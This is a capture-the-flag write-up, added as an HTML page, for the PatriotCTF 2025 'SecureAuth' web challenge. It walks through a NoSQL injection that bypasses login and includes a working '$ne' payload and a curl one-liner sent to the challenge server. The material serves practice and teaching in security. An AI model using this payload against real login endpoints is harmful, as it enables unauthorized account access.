@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>SecureAuth™ • syndro</title>
+
+  <script>
+    (function() {
+      const saved = localStorage.getItem('theme');
+      const prefersLight = window.matchMedia('(prefers-color-scheme: light)').matches;
+      if (saved === 'light' || (!saved && prefersLight)) document.documentElement.classList.add('light');
+      else document.documentElement.classList.remove('light');
+    })();
+  </script>
+
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&family=Roboto+Mono:wght@300;400;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../style.css">
+
+  <style>
+    :root { --accent: #58a6ff; --green: #3fb950; --purple: #8b5cf6; --pink: #f472b6; }
+    .light { --accent: #1f6feb; --green: #238636; }
+
+    body {
+      background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+      color: #e6edf3;
+      font-family: 'Roboto Mono', monospace;
+      min-height: 100vh;
+      padding: 40px 20px;
+      line-height: 1.8;
+      transition: background 0.5s, color 0.5s;
+    }
+    .light body { background: #f6f8fa; color: #0d1117; }
+
+    .container { max-width: 1100px; margin: 0 auto; }
+
+    h1 {
+      font-family: 'Orbitron', sans-serif;
+      font-size: 4.8rem;
+      text-align: center;
+      background: linear-gradient(90deg, var(--accent), var(--purple), var(--pink));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      margin: 20px 0 10px;
+      text-shadow: 0 0 30px rgba(88,166,255,0.3);
+    }
+    .light h1 { background: linear-gradient(90deg, #1f6feb, #7c3aed, #ec4899); -webkit-background-clip: text; }
+
+    .meta { text-align: center; opacity: 0.85; font-size: 1.2rem; margin-bottom: 60px; }
+    .meta span { color: var(--accent); font-weight: bold; }
+
+    h2 { color: var(--accent); margin: 50px 0 20px; font-family: 'Orbitron', sans-serif; font-size: 2.2rem; }
+
+    pre {
+      background: #161b22 !important;
+      color: #f0f6fc !important;
+      padding: 20px;
+      border-radius: 14px;
+      overflow-x: auto;
+      border: 1px solid #30363d;
+      font-size: 1.05rem;
+      margin: 25px 0;
+      white-space: pre-wrap;
+    }
+    .light pre {
+      background: #f6f8fa !important;
+      color: #24292f !important;
+      border: 1px solid #d0d7de !important;
+    }
+
+    code {
+      background: rgba(88,166,255,0.1);
+      padding: 4px 10px;
+      border-radius: 8px;
+      color: var(--green);
+    }
+    .light code { background: rgba(30,110,254,0.15); }
+
+    img {
+      display: block;
+      max-width: 100%;
+      border-radius: 16px;
+      margin: auto;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.6);
+      border: 2px solid rgba(88,166,255,0.3);
+      cursor: zoom-in;
+      transition: transform 0.3s ease;
+    }
+    .light img { box-shadow: 0 15px 40px rgba(0,0,0,0.15); }
+    img:hover { transform: scale(1.02); }
+
+    .flag {
+      background: rgba(0,255,0,0.1);
+      padding: 30px;
+      border-radius: 16px;
+      font-size: 1.8rem;
+      text-align: center;
+      margin: 60px 0;
+      color: var(--green);
+      font-weight: bold;
+      border: 3px dashed var(--green);
+      font-family: 'Roboto Mono', monospace;
+      letter-spacing: 1px;
+    }
+    .light .flag { background: rgba(35,134,54,0.08); border-color: #238636; }
+
+    .back {
+      position: fixed;
+      top: 30px;
+      left: 30px;
+      background: var(--accent);
+      color: #000;
+      padding: 16px 42px;
+      border-radius: 50px;
+      font-weight: bold;
+      text-decoration: none;
+      box-shadow: 0 12px 40px rgba(88,166,255,0.6);
+      transition: all 0.4s ease;
+      z-index: 9999;
+      font-size: 1.1rem;
+    }
+    .back:hover { transform: translateY(-8px) scale(1.05); box-shadow: 0 20px 60px rgba(88,166,255,0.8); }
+    .light .back { color: white; }
+
+   .modal {
+      display: none;
+      position: fixed;
+      z-index: 9999;
+      left: 0; top: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.95);
+      backdrop-filter: blur(10px);
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      cursor: zoom-out;
+    }
+    .modal.active { display: flex; }
+    .modal img {
+      max-width: 95%;
+      max-height: 95vh;
+      border-radius: 16px;
+      box-shadow: 0 0 100px rgba(88,166,255,0.6);
+    }
+    .close-modal {
+      position: absolute;
+      top: 30px; right: 40px;
+      font-size: 4rem;
+      color: white;
+      background: rgba(255,255,255,0.1);
+      width: 70px; height: 70px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+    .close-modal:hover { background: rgba(255,255,255,0.3); transform: scale(1.1); }
+
+    @media (max-width: 768px) {
+      h1 { font-size: 3.5rem; }
+      .back { position: static; display: block; margin: 30px auto; width: fit-content; }
+      .close-modal { top: 15px; right: 15px; font-size: 3rem; }
+    }
+      .theme-toggle {
+      position: fixed;
+      top: 30px;
+      right: 30px;
+      z-index: 9999;
+      background: var(--card);
+      color: var(--accent);
+      border: 2px solid var(--accent);
+      padding: 14px 28px;
+      border-radius: 50px;
+      font-weight: bold;
+      font-size: 1rem;
+      cursor: pointer;
+      box-shadow: 0 0 25px rgba(88,166,255,0.5);
+      transition: all 0.3s ease;
+      backdrop-filter: blur(10px);
+    }
+    .theme-toggle:hover {
+      background: var(--accent);
+      color: #000;
+      transform: scale(1.08);
+      box-shadow: 0 0 40px rgba(88,166,255,0.8);
+    }
+  </style>
+</head>
+<body>
+  <a href="https://syndro-1.github.io/page/CTF/PatriotCTF2025/patriotctf2025" class="back">Back</a>
+  <div class="theme-toggle" id="themeToggle">Theme</div>
+
+  <div class="container">
+    <h1>SecureAuth™</h1>
+    <div class="meta">PatriotCTF 2025 • <span>Web</span> • syndro</div>
+    
+    <h2>0. The Challenge description</h2>
+    <p>There is not much in challenge description</p>
+    <img src="https://github.com/user-attachments/assets/b74dcb4e-5f6e-482d-945a-d4ff6653e710" alt="SecureAuth banner">
+
+    <h2>1. Initial Login Page</h2>
+    <p>We’re greeted by a JSON-based login form. The <code>Content-Type: application/json</code>AKA, NoSQL Injection.</p>
+    <img src="https://github.com/user-attachments/assets/265d5d49-43fa-4a4e-b337-d4a1e848bb8e" alt="Login page">
+
+    <p>Tried the classic NoSQLi payload in the browser:</p>
+    <pre><code>Username: admin
+Password: {"$ne": null}</code></pre>
+    <p>→ Didn’t work. The payload was being sent as a string.</p>
+
+    <h2>2. Using Burp/ZAP</h2>
+    <p>Direct access to <code>/api/authenticate</code> gave “Method Not Allowed”. Switched to POST and added the proper header:</p>
+    <img src="https://github.com/user-attachments/assets/f8da4eae-0d3c-425f-bd26-4a9700912330" alt="Method not allowed">
+    <img src="https://github.com/user-attachments/assets/aa4de28e-f4d8-48eb-8676-cf063993a634" alt="Fixed request with POST + Content-Type">
+
+    <h2>3. Crafting the Real Payload</h2>
+    <p>The challenge literally tells us the backend structure:</p>
+    <img src="https://github.com/user-attachments/assets/02f7afdb-0a73-4099-ae0d-25765f629f5b" alt="Hint in source">
+
+    <p>So we send the <code>$ne</code> operator outside the quotes:</p>
+    <img src="https://github.com/user-attachments/assets/bdd1ac05-e831-4e51-b4b5-33560d2b6883" alt="Final payload in Burp">
+
+    <h2>4. Profits!</h2>
+    <p>Bypassed authentication and got the flag instantly.</p>
+    <img src="https://github.com/user-attachments/assets/f56ff919-b7e2-4519-b177-e4a78b7d8d65" alt="Flag revealed">
+
+    <h2>5. One-liner with cURL (No Burp/ZAP needed)</h2>
+    <pre><code>curl -X POST http://18.212.136.134:5200/api/authenticate \
+  -H "Content-Type: application/json" \
+  -d '{"username":"admin","password":{"$ne":null},"remember":"false"}'</code></pre>
+
+    <img src="https://github.com/user-attachments/assets/06868a28-4cf3-471d-81e5-0397d5ec3b8e" alt="cURL success">
+
+    <div class="flag">
+      FLAG(py7h0n_****}
+    </div>
+
+    <p>“SecureAuth™” — yeah, sure.</p>
+  </div>
+
+<div id="imageModal" class="modal">
+  <span class="close-modal">×</span>
+  <img id="modalImage" src="" alt="Zoomed image">
+</div>
+
+<script>
+  const modal = document.getElementById('imageModal');
+  const modalImg = document.getElementById('modalImage');
+
+  // Image zoom
+  document.querySelectorAll('img').forEach(img => {
+    if (img.closest('#imageModal')) return;
+    img.onclick = () => {
+      modalImg.src = img.src;
+      modal.classList.add('active');
+      document.body.style.overflow = 'hidden';
+    };
+  });
+
+  modal.addEventListener('click', (e) => {
+    if (e.target === modal || e.target.classList.contains('close-modal')) {
+      modal.classList.remove('active');
+      document.body.style.overflow = '';
+    }
+  });
+
+  document.addEventListener('keydown', (e) => {
+    if (e.key === 'Escape' && modal.classList.contains('active')) {
+      modal.classList.remove('active');
+      document.body.style.overflow = '';
+    }
+  });
+
+  // Theme toggle
+  document.getElementById('themeToggle')?.addEventListener('click', () => {
+    document.documentElement.classList.toggle('light');
+    const isLight = document.documentElement.classList.contains('light');
+    localStorage.setItem('theme', isLight ? 'light' : 'dark');
+  });
+</script>
+</body>
+</html>
